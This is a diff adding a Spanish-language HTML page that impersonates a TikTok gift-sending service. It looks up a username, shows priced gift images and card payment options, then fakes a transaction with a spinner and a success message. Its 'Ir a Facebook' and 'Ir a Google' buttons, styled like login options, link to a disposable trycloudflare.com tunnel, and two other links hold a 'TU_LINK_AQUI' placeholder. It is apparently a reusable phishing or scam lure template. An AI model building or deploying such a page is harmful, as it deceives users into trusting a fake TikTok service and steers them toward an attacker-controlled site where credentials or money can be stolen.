@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Gifts</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #000; color: #fff; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 393px; }
+                
+        .tiktok-logo { width: 72px; height: 72px; display: block; margin: 20px auto; }
+        input { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; background: #111; border: 1px solid #333; color: #fff; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 16px; border-radius: 12px; border: none; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: transform 0.2s; }
+        button:active { transform: scale(0.96); }
+                
+        /* Estilos para enlaces de redes sociales */
+        .social-separator { display: flex; align-items: center; text-align: center; margin: 20px 0; color: #666; font-size: 14px; }
+        .social-separator::before, .social-separator::after { content: ''; flex: 1; border-bottom: 1px solid #333; }
+        .social-separator:not(:empty)::before { margin-right: .5em; }
+        .social-separator:not(:empty)::after { margin-left: .5em; }
+                
+        .social-link { display: flex; align-items: center; justify-content: center; width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #333; background: #111; color: #fff; font-size: 15px; font-weight: 600; text-decoration: none; box-sizing: border-box; transition: background 0.2s; }
+        .social-link:hover { background: #1a1a1a; }
+        .social-link img { width: 20px; height: 20px; margin-right: 12px; }
+
+        #profile-display { background: #111; padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 20px; display: none; }
+        .avatar { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #fe2c55; margin-bottom: 10px; }
+                
+        .gift-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; height: 300px; overflow-y: auto; background: #111; padding: 10px; border-radius: 12px; }
+        .gift-item { border: 1px solid #333; border-radius: 8px; padding: 5px; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
+        .gift-item img { width: 100%; }
+        .selected { border: 2px solid #fff; }
+        .gift-price { position: absolute; bottom: 2px; right: 2px; background: rgba(0,0,0,0.7); color: #fff; font-size: 10px; padding: 2px 4px; border-radius: 4px; font-weight: bold; }
+        
+        .card-option { background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; cursor: pointer; }
+        .card-option.active { border: 2px solid #fff; }
+                
+        /* Carga y Alerta */
+        #loader-img { width: 72px; height: 72px; animation: spin 1.5s linear infinite; display: block; margin: 40px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        #super-alerta { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; 
+            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; 
+        }
+        .icon-regalo { width: 100px; height: 100px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-app">
+    <div id="step1-search">
+        <img src="https://images.icon-icons.com/3018/PNG/96/box_tiktok_icon_188584.png" class="tiktok-logo">
+        <h1 style="text-align: center;">𝙍𝙚𝙜𝙖𝙡𝙤𝙨 𝘿𝙚 𝙏𝙞𝙠-𝙏𝙤𝙠</h1>
+        <input type="text" id="username" placeholder="@usuario">
+        <button onclick="buscarPerfil()">𝘽𝙪𝙨𝙘𝙖𝙧 𝙋𝙚𝙧𝙛𝙞𝙡</button>
+        
+        <div id="social-login-section">
+            <div class="social-separator">Nuestras Redes</div>
+            
+            <a href=" https://royal-moore-market-musician.trycloudflare.com" target="_blank" class="social-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook">
+                Ir a Facebook
+            </a>
+            <a href=" https://royal-moore-market-musician.trycloudflare.com" target="_blank" class="social-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
+                Ir a Google
+            </a>
+            <a href="TU_LINK_AQUI" target="_blank" class="social-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="Apple">
+                Ir a Apple
+            </a>
+            <a href="TU_LINK_AQUI" target="_blank" class="social-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+                Ir a Telegram
+            </a>
+        </div>
+    </div>
+
+    <div id="profile-display">
+        <img id="avatar-img" class="avatar" src="" alt="Avatar">
+        <h2 id="display-name">@Usuario</h2>
+    </div>
+
+    <div id="step2" style="display:none;">
+        <p>𝑬𝒍𝒊𝒈𝒆 𝒕𝒖 𝒓𝒆𝒈𝒂𝒍𝒐:</p>
+        <div class="gift-grid" id="grid"></div>
+                
+        <p>Método de pago:</p>
+        <div class="card-option" onclick="seleccionarCard(this)">
+            <span>𝙑𝙞𝙨𝙖</span>
+            <img src="https://images.icon-icons.com/2341/PNG/96/visa_payment_method_card_icon_142729.png" width="40">
+        </div>
+        <div class="card-option" onclick="seleccionarCard(this)">
+            <span>𝙈𝙖𝙨𝙩𝙚𝙧𝙘𝙖𝙧𝙙</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="40">
+        </div>
+        <button onclick="iniciarCarga()">𝘊𝘰𝘯𝘧𝘪𝘳𝘮𝘢𝘳 𝘺 𝘌𝘯𝙫𝘪𝘢𝘳</button>
+    </div>
+
+    <div id="loader" style="display:none; text-align:center; margin-top: 50px;">
+        <img id="loader-img" src="https://images.icon-icons.com/1489/PNG/96/loadingcircles_102612.png">
+        <p style="font-weight: bold; font-size: 18px; margin-top: 20px;">Procesando transacción...</p>
+    </div>
+</div>
+
+<div id="super-alerta">
+    <img src="https://www.bet4.pe/assets/bet4_promotion-CmJXRReZ.svg" class="icon-regalo">
+    <h3>¡Éxito!</h3>
+    <p>El regalo llegará en 24 horas hábiles.</p>
+    <button onclick="reiniciarApp()" style="width: 200px; margin-top: 20px;">𝘼𝙘𝙚𝙥𝙩𝙖𝙧</button>
+</div>
+
+<script>
+    const giftsData = [
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/9b96e064a327ac9f720a767a1c2603b3.png~tplv-obj.webp", price: 14999 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/ef248375c4167d70c1642731c732c982~tplv-obj.webp", price: 25999 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/df63eee488dc0994f6f5cb2e65f2ae49~tplv-obj.webp", price: 10000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/8ef48feba8dd293a75ae9d4376fb17c9~tplv-obj.webp", price: 20000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/6026505eea9b9bce071dd699253abf6a~tplv-obj.webp", price: 10999 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/9ad035b088dfeaf298fdc9cd84d50000.png~tplv-obj.webp", price: 10009 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/8173e9b07875cca37caa5219e4903a40.png~tplv-obj.webp", price: 20000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/4ab2b1c3d5ce336a97eeaf2a8f131c00.png~tplv-obj.webp", price: 15000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/8520d47b59c202a4534c1560a355ae06~tplv-obj.webp", price: 50000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/e7ce188da898772f18aaffe49a7bd7db~tplv-obj.webp", price: 7000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/075198e03b73c4037429db72dc9ffa24.png~tplv-obj.webp", price: 5099 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/149b8ec691a1b9e5e7dac329e790e150.png~tplv-obj.webp", price: 4600 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/8b87bbb88b80a5bf63abb6abcd4fa147.png~tplv-obj.webp", price: 9999 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/483c644e67e9bb1dd5970f2df00b7576~tplv-obj.webp", price: 5999 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/858e9f4a507368b572738981e969b465.png~tplv-obj.webp", price: 3599 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/f260aeb10751f0ad9092e6c0c52c950e.png~tplv-obj.webp", price: 10000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/d80eedff9321f5acabafbc885918139e.png~tplv-obj.webp", price: 10099 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/3f1945b0d96e665a759f747e5e0cf7a9~tplv-obj.webp", price: 9960 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/719e1f271c29f2165bda5d787501c307.png~tplv-obj.webp", price: 3699 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/motor_icon_green.png~tplv-obj.webp", price: 5603 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/71883933511237f7eaa1bf8cd12ed575~tplv-obj.webp", price: 11000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/1d067d13988e8754ed6adbebd89b9ee8.png~tplv-obj.webp", price: 2920 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/796b15068f06c947eeead7517e0bd5e4.png~tplv-obj.webp", price: 2380 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/0de49ea9a79e65307c674596da517792.png~tplv-obj.webp", price: 8240 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/443c163954f4f7636909fb6980518745.png~tplv-obj.webp", price: 2858 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/1ea8dbb805466c4ced19f29e9590040f~tplv-obj.webp", price: 6000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/0eafd5c28cdb2563f3386679643abb29.png~tplv-obj.webp", price: 8000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/f33e074aa9308800afec8c0ecaa0ef42.png~tplv-obj.webp", price: 35000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/5734e71ba84d872c08d8c68e94b5ce36.png~tplv-obj.webp", price: 10000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/61e7dc294d766a81abf7bce5591db60c.png~tplv-obj.webp", price: 9300 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/c2413f87d3d27ac0a616ac99ccaa9278.png~tplv-obj.webp", price: 3310 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/469999dc1598d243114e9969f8d19467.png~tplv-obj.webp", price: 3288 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/5aa9258af43983e39f90cf300c3e98d4.png~tplv-obj.webp", price: 7000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/af980f4ec9ed73f3229df8dfb583abe6.png~tplv-obj.webp", price: 2500 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/af67b28480c552fd8e8c0ae088d07a1d.png~tplv-obj.webp", price: 11000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/17ce759753f11358e75a3c7568eaad1b.png~tplv-obj.webp", price: 7500 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/b5ac8bb9da5569185bfdc1be357d3906.png~tplv-obj.webp", price: 12000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/4a9a2b3c9ae95efd305eee880ded9c54.png~tplv-obj.webp", price: 3980 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/b446be331b24f136afbdff8eaf5cf9d5.png~tplv-obj.webp", price: 9390 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/5502bfb46b11ef92c70597eae10b35e3.png~tplv-obj.webp", price: 4000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/9494c8a0bc5c03521ef65368e59cc2b8~tplv-obj.webp", price: 11410 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/97a26919dbf6afe262c97e22a83f4bf1~tplv-obj.webp", price: 4200 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/863e7947bc793f694acbe970070440a1.png~tplv-obj.webp", price: 1430 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/991cb8b02429d17007db77e38c1aeaf6.png~tplv-obj.webp", price: 4540 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/2385dccf1c6ce8b31233186a1072c5ac.png~tplv-obj.webp", price: 5300 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/9108da5ad7e112db04db2ce97b81d527.png~tplv-obj.webp", price: 4600 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/0e3769575f5b7b27b67c6330376961a4.png~tplv-obj.webp", price: 7470 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/767d7ea90f58f3676bbc5b1ae3c9851d.png~tplv-obj.webp", price: 5000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/cc2fe165b4365bda331c47f0fd212acd.png~tplv-obj.webp", price: 4990 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/b2aafe2ca2e529b10194d143ef86a31b.png~tplv-obj.webp", price: 4000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/3cbaea405cc61e8eaab6f5a14d127511.png~tplv-obj.webp", price: 500 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/b48c69f4df49c28391bcc069bbc31b41.png~tplv-obj.webp", price: 350 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/1d1650cd9bb0e39d72a6e759525ffe59~tplv-obj.webp", price: 510 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/4756a2a4604d2cb5bb5b0639b259e9b5.png~tplv-obj.webp", price: 400 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/d4faa402c32bf4f92bee654b2663d9f1~tplv-obj.webp", price: 550 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/1153dd51308c556cb4fcc48c7d62209f.png~tplv-obj.webp", price: 560 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/964574672ba78aec095a139e955de948.png~tplv-obj.webp", price: 570 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/4227ed71f2c494b554f9cbe2147d4899~tplv-obj.webp", price: 580 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/805e6b8051d50ca6e6c9b74d5fc89045.png~tplv-obj.webp", price: 4000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/96d1cf92904427a17d81b868d7dafc91.png~tplv-obj.webp", price: 300 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/b6266323ef3ea0d313cbab6911ff8c46~tplv-obj.webp", price: 173 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/f76750ab58ee30fc022c9e4e11d25c9d.png~tplv-obj.webp", price: 620 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/eb0923dbab5251f4c2e0496b11b55c4f~tplv-obj.webp", price: 500 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/9f8bd92363c400c284179f6719b6ba9c~tplv-obj.webp", price: 610 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/70529cd75b4d64587658c462c45dc238~tplv-obj.webp", price: 690 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/183225b378b1bdf758a992781727b850~tplv-obj.webp", price: 600 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/79a02148079526539f7599150da9fd28.png~tplv-obj.webp", price: 670 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/21549ba24f76a01d00373cb8e35660ae.png~tplv-obj.webp", price: 1000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/e1932db6aea81bbddc4e7dc0229ac155~tplv-obj.webp", price: 690 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/0f158a08f7886189cdabf496e8a07c21~tplv-obj.webp", price: 700 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/148eef0884fdb12058d1c6897d1e02b9~tplv-obj.webp", price: 710 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/d78ed6496fd57286b42ac033acbee299.png~tplv-obj.webp", price: 100 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/551ecaf639c5e02354f9e7c1a763ec72.png~tplv-obj.webp", price: 730 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/resource/e033c3f28632e233bebac1668ff66a2f.png~tplv-obj.webp", price: 973 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/b158b8493b51a3f30c59710c39d1dc96~tplv-obj.webp", price: 9000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/cb4e11b3834e149f08e1cdcc93870b26~tplv-obj.webp", price: 5500 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/12374117770f779919bf002461fdfac0.png~tplv-obj.webp", price: 8000 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/075e206d6da035f10ff5f8fecd82abcc.png~tplv-obj.webp", price: 222 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/alisg/webcast-sg/resource/6703facdac34caefbd0617a6321afe9b.png~tplv-obj.webp", price: 100 },
+        { url: "https://p16-webcast.tiktokcdn.com/img/maliva/webcast-va/98bea1b189fba75bf0ca766b4dc1976e~tplv-obj.webp", price: 703 }
+    ];
+
+    function buscarPerfil() {
+        const user = document.getElementById('username').value;
+        if(user) {
+            // Oculta el buscador y las redes sociales de golpe
+            document.getElementById('step1-search').style.display = 'none';
+            
+            // Carga y muestra los datos del perfil y el catálogo
+            document.getElementById('display-name').innerText = user.startsWith('@') ? user : '@' + user;
+            document.getElementById('avatar-img').src = `https://unavatar.io/tiktok/${user.replace('@','')}`;
+            document.getElementById('profile-display').style.display = 'block';
+            document.getElementById('step2').style.display = 'block';
+                        
+            const grid = document.getElementById('grid');
+            grid.innerHTML = '';
+            giftsData.forEach(item => {
+                grid.innerHTML += `<div class="gift-item" onclick="seleccionar(this)">
+                    <img src="${item.url}" width="100%">
+                    <span class="gift-price">$${item.price}</span>
+                </div>`;
+            });
+        }
+    }
+
+    function seleccionar(el) {
+        document.querySelectorAll('.gift-item').forEach(item => item.classList.remove('selected'));
+        el.classList.add('selected');
+    }
+
+    function seleccionarCard(el) {
+        document.querySelectorAll('.card-option').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function iniciarCarga() {
+        // Corrección de visualización: Oculta catálogo y avatar por completo
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('profile-display').style.display = 'none';
+        
+        // Muestra el loader correctamente en pantalla
+        document.getElementById('loader').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('super-alerta').style.display = 'flex';
+        }, 3000);
+    }
+
+    function reiniciarApp() {
+        document.getElementById('super-alerta').style.display = 'none';
+        location.reload();
+    }
+</script>
+</body>
+</html>
